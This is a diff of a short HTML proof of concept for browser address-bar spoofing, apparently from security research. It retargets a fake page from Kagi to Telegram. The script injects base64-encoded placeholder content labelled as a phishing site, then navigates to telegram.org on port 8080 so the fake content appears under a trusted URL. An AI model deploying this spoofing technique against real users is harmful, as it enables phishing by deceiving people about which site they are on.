@@ -1,10 +1,10 @@
 \<html>
-    <title>Fake Kagi</title>
+    <title>Fake Telegram</title>
     <body>
     <script>
      function spoof()
      {
-     var data = 'PGh0bWw+PGJvZHk+PGgxIGFsaWduPSJjZW50ZXIiPkthZ2kgUGhpc2hpbmcgV2Vic2l0ZTwvaDE+PC9ib2R5PjwvaHRtbD4='; // base64 encoded html content
+     var data = 'PGh0bWw+PGJvZHk+PGgxIGFsaWduPSJjZW50ZXIiPlRlbGVncmFtIFBoaXNoaW5nIFdlYnNpdGU8L2gxPjwvYm9keT48L2h0bWw+'; // base64 encoded html content
      document.body.innerHTML=atob(data);
      window.location.assign("https://www.telegram.org:8080");
      }
